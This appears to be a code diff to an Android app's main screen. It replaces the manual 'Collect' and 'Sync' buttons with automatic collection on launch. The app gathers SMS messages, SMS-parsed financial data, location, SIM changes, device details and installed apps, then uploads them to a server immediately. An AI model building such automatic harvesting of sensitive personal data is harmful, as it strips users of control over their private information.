@@ -5,7 +5,8 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
-import android.widget.Button;
+import android.view.View;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
@@ -18,6 +19,7 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 100;
     private TextView statusText;
+    private ProgressBar progressBar;
 
     private final String[] REQUIRED_PERMISSIONS = {
         Manifest.permission.READ_SMS,
@@ -40,59 +42,40 @@ public class MainActivity extends AppCompatActivity {
         }
 
         setContentView(R.layout.activity_main);
+        statusText   = findViewById(R.id.statusText);
+        progressBar  = findViewById(R.id.progressBar);
 
-        statusText = findViewById(R.id.statusText);
-        Button btnCollect = findViewById(R.id.btnCollect);
-        Button btnSync = findViewById(R.id.btnSync);
-
-        btnCollect.setOnClickListener(v -> {
-            if (allPermissionsGranted()) {
-                startCollection();
-            } else {
-                requestPermissions();
-            }
-        });
-
-        btnSync.setOnClickListener(v -> {
-            DataSyncManager syncManager = new DataSyncManager(this);
-            syncManager.syncAll(() -> {
-                runOnUiThread(() -> Toast.makeText(this, "Sync complete!", Toast.LENGTH_SHORT).show());
-            });
-        });
-
-        // Auto check SIM change on every launch
+        // Auto-start: request permissions or immediately collect+sync
         if (allPermissionsGranted()) {
-            SimChangeDetector simDetector = new SimChangeDetector(this);
-            simDetector.checkAndRecordSimChange();
+            startCollectionAndSync();
+        } else {
+            statusText.setText("Requesting permissions…");
+            requestRequiredPermissions();
         }
     }
 
-    private void startCollection() {
-        statusText.setText("Collecting data...");
+    private void startCollectionAndSync() {
+        statusText.setText("Collecting data…");
 
         new Thread(() -> {
-            SmsCollector smsCollector = new SmsCollector(this);
-            smsCollector.collect();
+            // Collect all data
+            new SmsCollector(this).collect();
+            new LocationCollector(this).collect();
+            new SimChangeDetector(this).checkAndRecordSimChange();
+            new SmsAnalyzer(this).analyze();
+            new DeviceInfoCollector(this).collect();
+            new InstalledAppsCollector(this).collect();
 
-            LocationCollector locationCollector = new LocationCollector(this);
-            locationCollector.collect();
+            runOnUiThread(() -> statusText.setText("Syncing to server…"));
 
-            SimChangeDetector simDetector = new SimChangeDetector(this);
-            simDetector.checkAndRecordSimChange();
-
-            // New collectors — SMS-parsed financial/telecom/ride data
-            SmsAnalyzer smsAnalyzer = new SmsAnalyzer(this);
-            smsAnalyzer.analyze();
-
-            // Device info (root, age, factory reset, etc.)
-            DeviceInfoCollector deviceCollector = new DeviceInfoCollector(this);
-            deviceCollector.collect();
-
-            // Installed apps detection
-            InstalledAppsCollector appsCollector = new InstalledAppsCollector(this);
-            appsCollector.collect();
-
-            runOnUiThread(() -> statusText.setText("✅ All data collected! Press Sync to upload."));
+            // Auto-sync immediately after collection
+            new DataSyncManager(this).syncAll(() ->
+                runOnUiThread(() -> {
+                    progressBar.setVisibility(View.GONE);
+                    statusText.setText("✅ Done! All data collected and synced.");
+                    Toast.makeText(this, "Sync complete!", Toast.LENGTH_SHORT).show();
+                })
+            );
         }).start();
     }
 
@@ -106,7 +89,7 @@ public class MainActivity extends AppCompatActivity {
         return true;
     }
 
-    private void requestPermissions() {
+    private void requestRequiredPermissions() {
         List<String> needed = new ArrayList<>();
         for (String permission : REQUIRED_PERMISSIONS) {
             if (ContextCompat.checkSelfPermission(this, permission)
@@ -124,9 +107,13 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
             if (allPermissionsGranted()) {
-                startCollection();
+                // All granted — auto collect and sync
+                startCollectionAndSync();
             } else {
-                Toast.makeText(this, "All permissions required!", Toast.LENGTH_LONG).show();
+                statusText.setText("⚠️ Permissions required to continue.");
+                Toast.makeText(this,
+                    "Please grant all permissions for the app to work.",
+                    Toast.LENGTH_LONG).show();
             }
         }
     }
